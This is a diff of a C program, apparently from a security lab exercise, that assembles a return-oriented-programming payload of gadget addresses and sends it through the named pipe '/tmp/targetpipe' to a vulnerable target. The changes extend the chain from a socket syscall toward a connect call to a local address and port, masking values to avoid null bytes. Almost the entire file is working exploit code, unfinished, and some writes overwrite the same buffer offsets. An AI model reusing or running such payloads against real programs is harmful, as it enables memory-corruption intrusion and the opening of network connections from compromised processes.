@@ -5,13 +5,14 @@
 
 #define PIPEPATH "/tmp/targetpipe"
 
-struct sockaddr_in {
-  char filler[1]; // Byte 0
-  char af_inent[1]; // Byte 1
-  char port_num[2]; // Bytes 2-3
-  char ip_addr[4]; // Bytes 4-7
-  char filler2[8] // Bytes 8-15
-} sockaddr_in;
+// For Reference
+// struct sockaddr_in {
+//   char filler[1]; // Byte 0
+//   char af_inent[1]; // Byte 1
+//   char port_num[2]; // Bytes 2-3
+//   char ip_addr[4]; // Bytes 4-7
+//   char filler2[8] // Bytes 8-15
+// } sockaddr_in;
 
 int main(void)
 {
@@ -19,11 +20,14 @@ int main(void)
 
   char trap[] = "\xe5\xb6\xa9\xbb";
 
+  char pop_eax[] = "\xe1\xa0\xb9\xbb";
   char pop_edx[] = "\x1b\xdc\xb9\xbb";
   char pop_ecx[] = "\x22\xa4\xba\xbb";
 
   char xor_eax[] = "\xc2\xb3\xa9\xbb"; 
   char xor_edx[] = "\xd4\xbe\xb3\xbb";
+
+  char and_eax_edx[] = "\x8a\xe9\xb3\xbb";
 
   char add_dl_al[] = "\x07\x46\xbb\xbb";
   char add_cl_ah[] = "\xd7\xbd\xa7\xbb";
@@ -33,22 +37,40 @@ int main(void)
   char dec_ecx[] = "\x17\xe7\xb7\xbb";
 
   char write_at_ecx_from_edx[] = "\x7e\xb8\xb6\xbb";
+  char write_at_edx_from_eax[] = "\x79\x2d\xb5\xbb";
+
+  char jump_12[] = "\x68\x8b\xaa\xbb";
+  char jump_16[] = "\x2a\x01\xad\xbb";
 
   char dummy_ret[] = "\x9c\x36\xa7\xbb";
 
+  // _socket30 syscall
   char socket_arg1[] = "\x8a\x01\x01\x01";
   char socket_arg2[] = "\x01\x01\x01\x01";
 
-  char socket_stack_arg1_address[] = "\x04\x68\xbf\xbf"; // -> 2
-  char socket_stack_arg2_address[] = "\x08\x68\xbf\xbf"; // -> 1
-  char socket_stack_arg3_address[] = "\x0c\x68\xbf\xbf"; // -> 0
+  char socket_stack_arg1_address[] = "\x04\x68\xbf\xbf"; // -> 2, bufr + 231
+  char socket_stack_arg2_address[] = "\x08\x68\xbf\xbf"; // -> 1, bufr + 235
+  char socket_stack_arg3_address[] = "\x0c\x68\xbf\xbf"; // -> 0, bufr + 239
 
-  struct sockaddr_in info;
-  strcpy(info.filler, "\x01");
-  strcpy(info.af_inent, "\x02");
-  strcpy(info.port_num, "\x39\x30");
-  strcpy(info.ip_addr, "\x01\x01\x01\x7f"); // filler value
-  strcpy(info.filler2, "\x01\x01\x01\x01\x01\x01\x01\x01");
+  // connect syscall
+
+  char con_arg_3_addr[] = "";
+  
+  char con_arg_ip[] = "\x7f\x01\x01\x01";
+  char con_arg_ip_mask[] = "\xff\xf0\xf0\xff";
+  char con_arg_ip_addr[] = "\x24\x68\xbf\xbf"; // bufr + 263
+
+  // bufr + 259
+  // info.filler = "\x01"
+  // info.af_inent = "\x02"
+  // info.port_num = "\x39\x30"
+  // bufr + 263
+  // info.ip_addr = "\x01\x01\x01\x01" filler value, should be 0x0100007f before syscall
+  // info.filler2 = "\x01\x01\x01\x01\x01\x01\x01\x01"
+
+  char sockaddr_in[] = "\x01\x02\x39\x30\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01";
+
+
   int i;
   // Fill up buffer
   for(i = 0; i < 131; i++)
@@ -77,7 +99,7 @@ int main(void)
   // pop first address of args -> 2
   strcpy(bufr + 171, pop_ecx); // 0xbbaa422 dec_ecx
   strcpy(bufr + 175, socket_stack_arg1_address); // -> 0xbfbf6804
-  // dummy gadget
+  // dummy gadget to avoid null character in address
   strcpy(bufr + 179, dummy_ret);
   strcpy(bufr + 183, write_at_ecx_from_edx); // 0xbbb6b87e
   // clear edx
@@ -95,17 +117,42 @@ int main(void)
   strcpy(bufr + 215, socket_stack_arg3_address); // -> 0xbfbf680c
   strcpy(bufr + 219, write_at_ecx_from_edx); // 0xbbb6b87e
 
-  // trap into the kernel
+  // trap into the kernel for _socket30 syscall
   strcpy(bufr + 223, trap);  // location is 0xbfbf67fc
-  // dummy val
-  strcpy(bufr + 227, "\x68\x8b\xaa\xbb");
+  // jump 12 bytes to next gadget
+  strcpy(bufr + 227, jump_12);
   // socket arg 1 -> 2
   strcpy(bufr + 231, "\x01\x01\x01\x01");
   // socket arg 2 -> 1
   strcpy(bufr + 235, "\x01\x01\x01\x01");
   // socket arg 3 -> 0
   strcpy(bufr + 239, "\x01\x01\x01\x01");
-  strcpy(bufr + 243, "\x02\x02\x02\x02"); // test value
+
+  // pop ip_address without null chars into edx
+  strcpy(bufr + 243, pop_edx);
+  strcpy(bufr + 247, con_arg_ip);
+  // pop mask into eax
+  strcpy(bufr + 243, pop_eax);
+  strcpy(bufr + 247, con_arg_ip_mask);
+  // AND ecx and eax to get ip address
+  strcpy(bufr + 251, and_eax_edx);
+                                  // eax should have 0x0100007f
+  // store socket struct and jump over it
+  strcpy(bufr + 255, jump_16);
+  strcpy(bufr + 259, sockaddr_in);
+  // pop ip address addr into edx
+  strcpy(bufr + 275, pop_edx);
+  strcpy(bufr + 279, con_arg_ip_addr);
+  // write eax to where edx points
+  strcpy(bufr + 279, write_at_edx_from_eax);
+                                            // 0x0bfbf6824 should store 0x0100007f
+  //
+  // hardcoded file descriptor
+  //strcpy(bufr + , "\x01\x01\x01\x01");
+  // store address of socketaddr_in struct
+  //strcpy(bufr + , sockaddr_in_addr);
+  // 4 byte value 16
+  //strcpy(bufr + , "\x01\x01\x01\x01");
 
   writecmd(PIPEPATH, bufr);
   
